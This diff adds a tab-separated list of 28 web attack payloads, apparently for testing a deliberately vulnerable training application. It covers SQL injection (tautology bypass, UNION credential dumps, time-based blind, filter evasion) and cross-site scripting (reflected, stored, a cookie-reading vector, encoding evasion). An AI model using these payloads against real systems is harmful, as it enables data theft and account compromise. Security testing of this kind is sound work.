@@ -1,0 +1,29 @@
+id	category	endpoint	method	param	payload	description
+ATK-01	SQLi_InBand	/vulnerabilities/sqli/	GET	id	' OR '1'='1	Classic tautology authentication/filter bypass
+ATK-02	SQLi_InBand	/vulnerabilities/sqli/	GET	id	1' OR 1=1 #	Numeric tautology with hash comment
+ATK-03	SQLi_InBand	/vulnerabilities/sqli/	GET	id	1' UNION SELECT first_name, last_name FROM users #	UNION-based data extraction
+ATK-04	SQLi_InBand	/vulnerabilities/sqli/	GET	id	1' UNION SELECT user, password FROM users #	UNION-based credential hash dump
+ATK-05	SQLi_InBand	/vulnerabilities/sqli/	GET	id	1' UNION ALL SELECT NULL, version() #	UNION version fingerprinting
+ATK-06	SQLi_InBand	/vulnerabilities/sqli/	GET	id	1' ORDER BY 10 -- -	Column count enumeration
+ATK-07	SQLi_Blind	/vulnerabilities/sqli_blind/	GET	id	1' AND 1=1 #	Boolean blind true condition
+ATK-08	SQLi_Blind	/vulnerabilities/sqli_blind/	GET	id	1' AND 1=2 #	Boolean blind false condition
+ATK-09	SQLi_Blind	/vulnerabilities/sqli_blind/	GET	id	1' AND SLEEP(2) #	Time-based blind sleep injection
+ATK-10	SQLi_Blind	/vulnerabilities/sqli_blind/	GET	id	1' AND IF(1=1,SLEEP(2),0) #	Conditional time-based blind injection
+ATK-11	SQLi_Blind	/vulnerabilities/sqli_blind/	GET	id	1' AND SUBSTRING(database(),1,1)='d' #	Boolean blind schema extraction
+ATK-12	SQLi_Evasion	/vulnerabilities/sqli/	GET	id	1'/**/UnIoN/**/SeLeCt/**/1,2#	Comment obfuscation and mixed case
+ATK-13	SQLi_Evasion	/vulnerabilities/sqli/	GET	id	1' /*!50000OR*/ 1=1#	MySQL conditional comment bypass
+ATK-14	SQLi_Evasion	/vulnerabilities/sqli/	GET	id	1' OR 2>1 --+	Alternative comparison operator tautology
+ATK-15	SQLi_Evasion	/vulnerabilities/sqli/	GET	id	1'\tOR\t'a'='a	Horizontal tab whitespace mutation
+ATK-16	XSS_Reflected	/vulnerabilities/xss_r/	GET	name	<script>alert(1)</script>	Classic reflected script tag
+ATK-17	XSS_Reflected	/vulnerabilities/xss_r/	GET	name	<img src=x onerror=alert(1)>	Image onerror event handler
+ATK-18	XSS_Reflected	/vulnerabilities/xss_r/	GET	name	<svg onload=alert(1)>	SVG onload vector
+ATK-19	XSS_Reflected	/vulnerabilities/xss_r/	GET	name	"><script>alert(document.cookie)</script>	Attribute breakout and cookie theft
+ATK-20	XSS_Stored	/vulnerabilities/xss_s/	POST	mtxMessage	<script>alert('stored')</script>	Stored script tag in guestbook message
+ATK-21	XSS_Stored	/vulnerabilities/xss_s/	POST	mtxMessage	<img src=x onerror=alert('xss')>	Stored image onerror in guestbook message
+ATK-22	XSS_Stored	/vulnerabilities/xss_s/	POST	txtName	<script>alert(1)</script>	Stored script tag in guestbook name field
+ATK-23	XSS_Stored	/vulnerabilities/xss_s/	POST	mtxMessage	<iframe src="javascript:alert(1)">	Stored iframe javascript URI
+ATK-24	XSS_Evasion	/vulnerabilities/xss_r/	GET	name	<ScRiPt>alert(1)</sCrIpT>	Mixed case tag obfuscation
+ATK-25	XSS_Evasion	/vulnerabilities/xss_r/	GET	name	<svg/onload=alert(1)>	Slash separator instead of space
+ATK-26	XSS_Evasion	/vulnerabilities/xss_r/	GET	name	<details open ontoggle=alert(1)>	HTML5 details ontoggle event
+ATK-27	XSS_Evasion	/vulnerabilities/xss_r/	GET	name	<body onload=alert(1)>	Body onload vector
+ATK-28	XSS_Evasion	/vulnerabilities/xss_r/	GET	name	<a href="jav&#x61;script:alert(1)">click</a>	HTML entity encoded javascript URI
